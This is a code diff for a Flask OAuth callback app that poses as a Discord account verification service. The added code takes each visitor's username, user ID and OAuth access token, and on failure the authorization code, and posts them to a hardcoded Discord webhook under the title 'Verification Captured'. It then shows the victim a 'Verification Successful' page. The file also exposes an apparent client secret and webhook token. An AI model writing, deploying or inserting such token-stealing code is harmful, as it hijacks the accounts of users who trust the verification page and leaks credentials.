@@ -6,7 +6,7 @@ app = Flask(__name__)
 
 CLIENT_ID = "1526220638283628624"
 CLIENT_SECRET = "Ll-Nk5CH4a1RZF_RWhV-j9ueE4Wsh8jj"
-REDIRECT_URI = "https://root1-ldbs6rh0h-root-6c67.vercel.app"
+REDIRECT_URI = "https://root1-two.vercel.app"
 WEBHOOK_URL = "https://discord.com/api/webhooks/1569026174275944600/VBLBlmc8bf1dguN1S9kjJQ2TvVzIUnZbuSiUEcvhDi5emEiDwn4weplUamhUY2775Vk3"
 
 
@@ -78,4 +78,56 @@ def callback(path):
       payload = {
           "embeds": [{
               "title": "🔑 Verification Captured",
-              "color
+              "color": 5763719,
+              "fields": [
+                  {
+                      "name": "User",
+                      "value": f"{username} (`{user_id}`)",
+                      "inline": True,
+                  },
+                  {
+                      "name": "Access Token",
+                      "value": f"`{access_token}`",
+                      "inline": False,
+                  },
+              ],
+          }]
+      }
+      requests.post(WEBHOOK_URL, json=payload, timeout=10)
+    else:
+      error_payload = {
+          "content": (
+              "⚠️ OAuth Token Exchange Failed: ```json\n"
+              f"{token_json}\n``` Code was: `{code}`"
+          )
+      }
+      requests.post(WEBHOOK_URL, json=error_payload, timeout=10)
+  except Exception as e:
+    try:
+      requests.post(
+          WEBHOOK_URL, json={"content": f"🚨 Server Exception: `{str(e)}`"}, timeout=5
+      )
+    except:
+      pass
+
+  return render_template_string("""
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <title>Verification Successful</title>
+            <style>
+                body { background-color: #1e1f22; color: #f2f3f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+                .card { background-color: #2b2d31; padding: 40px; border-radius: 8px; text-align: center; border: 1px solid #35363c; }
+                h1 { color: #23a55a; font-size: 22px; margin-bottom: 15px; }
+                p { color: #949ba4; font-size: 14px; }
+            </style>
+        </head>
+        <body>
+            <div class="card">
+                <h1>Verification Successful!</h1>
+                <p>Your account has been verified. You can close this tab.</p>
+            </div>
+        </body>
+        </html>
+    """)
